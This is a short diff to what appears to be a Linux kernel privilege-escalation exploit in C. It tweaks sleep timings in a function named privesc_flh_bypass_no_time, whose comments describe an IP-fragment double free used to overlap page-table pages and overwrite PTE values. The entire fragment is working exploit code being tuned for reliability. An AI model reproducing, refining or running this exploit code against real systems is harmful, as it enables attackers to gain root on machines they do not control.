@@ -342,7 +342,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// causes end == offset in ip_frag_queue(). packet will be empty
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
-
+	sleep(3);
 	// allocate overlapping PMD page (overlaps with PTE)
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 
@@ -371,7 +371,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-	sleep(5);
+	sleep(3);
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
